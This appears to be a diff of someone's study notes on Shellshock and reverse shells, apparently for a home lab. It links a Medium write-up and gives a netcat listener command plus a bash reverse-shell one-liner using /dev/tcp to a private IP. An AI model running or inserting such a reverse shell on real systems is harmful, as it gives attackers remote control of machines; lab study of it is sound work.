@@ -29,7 +29,7 @@ HM
 
 # 3 even better method
 https://medium.com/@hackbotone/shellshock-attack-on-a-remote-web-server-d9124f4a0af3
-- // >& <location> redirects stdout and stderr to be redirected to <location>
+- // >& `location` redirects stdout and stderr to be redirected to `location`
 - // 0<&1 redirects std in back to the shell
 1. on HM: `nc –l 4444`
 2. on VM: `/bin/bash -i >& /dev/tcp/192.168.0.xxx/4444 0<&1`
